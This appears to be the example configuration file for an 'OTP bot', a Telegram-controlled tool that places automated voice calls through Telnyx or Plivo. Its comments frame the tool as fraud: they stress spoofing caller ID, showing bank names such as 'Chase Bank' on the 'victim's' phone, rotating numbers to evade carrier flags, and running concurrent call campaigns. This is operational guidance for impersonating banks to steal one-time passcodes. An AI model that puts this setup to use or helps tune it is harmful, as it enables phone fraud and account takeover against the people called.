# Pizza OTP Bot Configuration
# Copy this file to config.yml and fill in your credentials

# ===========================================
# TELEGRAM SETTINGS
# ===========================================
# Get this from @BotFather on Telegram
bot_token: "123456789:ABCdefGHIjklMNOpqrsTUVwxyz123456789"

# Your Telegram user ID(s) - get yours with @userinfobot
# Leave empty to allow everyone (NOT RECOMMENDED)
admin_ids:
  - 123456789

# ===========================================
# VOICE PROVIDER SETTINGS
# ===========================================
# Choose your voice/SMS provider: telnyx or plivo
#
# IMPORTANT: Plivo no longer allows caller ID spoofing!
# Use Telnyx for best results (supports true caller ID spoofing).
#
# - telnyx: RECOMMENDED - supports caller ID spoofing, cheapest rates
# - plivo: Legacy support only (spoofing DISABLED)
voice_provider: "telnyx"

# ===========================================
# TELNYX SETTINGS (RECOMMENDED)
# ===========================================
# Get these from https://portal.telnyx.com/
# API key: Settings -> API Keys
telnyx_api_key: "KEYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"

# Your verified Telnyx phone number (with country code, e.g., +15551234567)
telnyx_number: "+15551234567"

# ===========================================
# PLIVO SETTINGS (LEGACY - SPOOFING DISABLED)
# ===========================================
# Get these from https://console.plivo.com/dashboard/
# NOTE: Plivo has disabled caller ID spoofing as of 2024
plivo_auth_id: "PAXXXXXXXXXX"
plivo_auth_token: "your_plivo_auth_token_here"

# Your verified Plivo phone number (with country code, e.g., +15551234567)
plivo_number: "+15551234567"

# ===========================================
# CALLER ID SPOOFING (CRITICAL FOR EFFECTIVENESS)
# ===========================================
# Spoof the caller ID to show a different number on victim's phone
# The number MUST be verified/owned in your voice provider account!
# If not set, uses your main provider number by default
caller_id: "+15559876543"

# Display name shown on victim's phone (BANK NAME EFFECT)
# This is the NAME that shows up on their screen instead of a number!
# Supported by most carriers in the US
# Examples: "Chase Bank", "Amazon Support", "Apple Inc", "Security Dept"
caller_name: "Chase Bank"

# Enable CNAM lookup - shows caller name from carrier database
# When true, carrier may override caller_name with their registered name
# Default: false
enable_cnam: false

# Randomize caller ID from a pool of numbers
# Each call will use a different number from the pool
# Default: false
randomize_caller_id: false

# Pool of caller IDs to rotate through
# Use multiple verified numbers to avoid carrier flags
caller_id_pool:
  - "+15551111111"
  - "+15552222222"
  - "+15553333333"

# ===========================================
# VOICEMAIL DETECTION
# ===========================================
# Enable automatic voicemail/answering machine detection
# When detected, call ends quickly to save money
# Default: true
machine_detection: true

# How long to let phone ring before giving up (seconds)
ring_timeout: 30

# ===========================================
# SERVER SETTINGS
# ===========================================
# Webhook port for Plivo callbacks
port: "3000"

# Ngrok URL for local development
# Run: ngrok http 3000
# Then update this with your ngrok URL
ngrok_url: "https://abc123.ngrok.io"

# ===========================================
# DATABASE SETTINGS
# ===========================================
database_path: "./data/bot.db"
log_path: "./logs/bot.log"

# ===========================================
# CAMPAIGN SETTINGS
# ===========================================
# Max concurrent calls (1-50)
concurrency: 5

# Max retry attempts per number
max_retries: 3

# Call timeout in seconds (10-300)
call_timeout: 60
